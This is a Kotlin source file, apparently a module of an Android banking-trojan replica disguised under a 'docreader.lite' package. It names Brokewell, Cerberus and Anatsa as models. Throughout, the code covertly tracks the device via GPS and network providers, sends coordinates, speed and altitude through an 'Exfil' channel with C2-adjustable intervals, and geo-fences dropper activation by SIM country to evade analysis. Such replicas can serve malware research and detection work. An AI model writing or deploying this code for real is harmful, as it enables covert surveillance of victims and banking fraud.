package com.docreader.lite.reader

import android.annotation.SuppressLint
import android.content.Context
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper

/**
 * Geolocation tracking — continuous GPS/network position reporting.
 *
 * Family reference:
 *   - Brokewell: continuous location updates sent to C2
 *   - ToxicPanda: geo-fencing for region-specific campaigns
 *   - Cerberus: location-based C2 activation
 *   - Anatsa V4: country code validation (geo-fence dropper activation)
 *
 * Use cases in banking fraud:
 *   1. Geo-fencing: only activate in target countries (avoid sandbox VMs)
 *   2. Anti-analysis: emulators often report null/0,0 location
 *   3. Fraud validation: bank checks if transaction location matches device
 *   4. C2 routing: direct to region-specific C2 infrastructure
 *   5. Target selection: different overlays per geographic region
 *
 * Requests both GPS_PROVIDER and NETWORK_PROVIDER for redundancy.
 * Falls back to last known location if real-time unavailable.
 */
object LocationHelper {

    private var locationManager: LocationManager? = null
    private var isTracking = false
    private var lastLocation: Location? = null
    private val handler = Handler(Looper.getMainLooper())

    // Tracking configuration (C2-updatable)
    var intervalMs: Long = 300_000  // 5 minutes default
        private set
    var minDistanceM: Float = 50f    // 50 meters minimum displacement
        private set

    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            lastLocation = location
            reportLocation(location, "realtime")
        }

        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }

    @SuppressLint("MissingPermission")
    fun startTracking(context: Context) {
        if (isTracking) return

        locationManager = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
            ?: return

        isTracking = true

        // Request from GPS provider
        try {
            locationManager?.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                intervalMs,
                minDistanceM,
                locationListener,
                Looper.getMainLooper()
            )
        } catch (_: Exception) {}

        // Request from network provider (cell tower / WiFi)
        try {
            locationManager?.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                intervalMs,
                minDistanceM,
                locationListener,
                Looper.getMainLooper()
            )
        } catch (_: Exception) {}

        // Immediately send last known
        sendLastKnown()

        Exfil.event("geo_tracking_started",
            "interval_ms" to intervalMs.toString(),
            "min_distance_m" to minDistanceM.toString()
        )
    }

    fun stopTracking() {
        if (!isTracking) return
        isTracking = false
        try {
            locationManager?.removeUpdates(locationListener)
        } catch (_: Exception) {}
        Exfil.event("geo_tracking_stopped")
    }

    fun updateConfig(newInterval: Long, newMinDistance: Float) {
        intervalMs = newInterval
        minDistanceM = newMinDistance
        // If tracking, restart with new params
        if (isTracking) {
            val ctx = locationManager // Can't restart without context, but params update for next start
            Exfil.event("geo_config_updated",
                "interval_ms" to intervalMs.toString(),
                "min_distance_m" to minDistanceM.toString()
            )
        }
    }

    /**
     * One-shot location grab — used for device recon beacon.
     * Returns last known location without starting continuous tracking.
     */
    @SuppressLint("MissingPermission")
    fun getLastKnown(context: Context): Location? {
        val lm = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
            ?: return null

        // Try GPS first, fall back to network
        val gps = try { lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) }
        catch (_: Exception) { null }

        val net = try { lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) }
        catch (_: Exception) { null }

        // Return the more recent one
        return when {
            gps != null && net != null -> if (gps.time > net.time) gps else net
            gps != null -> gps
            net != null -> net
            else -> null
        }
    }

    /**
     * Check if device is in target country (geo-fence).
     * Used by dropper to only activate in target regions.
     */
    fun isInTargetRegion(context: Context, targetCountries: List<String>): Boolean {
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE)
            as? android.telephony.TelephonyManager
        val simCountry = tm?.simCountryIso?.uppercase() ?: ""
        val netCountry = tm?.networkCountryIso?.uppercase() ?: ""

        return targetCountries.any {
            it.uppercase() == simCountry || it.uppercase() == netCountry
        }
    }

    @SuppressLint("MissingPermission")
    private fun sendLastKnown() {
        val gps = try {
            locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        } catch (_: Exception) { null }

        val net = try {
            locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        } catch (_: Exception) { null }

        val loc = gps ?: net
        if (loc != null) {
            lastLocation = loc
            reportLocation(loc, "last_known")
        }
    }

    private fun reportLocation(location: Location, source: String) {
        Exfil.event("geo_location",
            "lat" to location.latitude.toString(),
            "lon" to location.longitude.toString(),
            "accuracy" to location.accuracy.toString(),
            "altitude" to location.altitude.toString(),
            "speed" to location.speed.toString(),
            "provider" to (location.provider ?: "unknown"),
            "source" to source,
            "time" to location.time.toString()
        )
    }
}
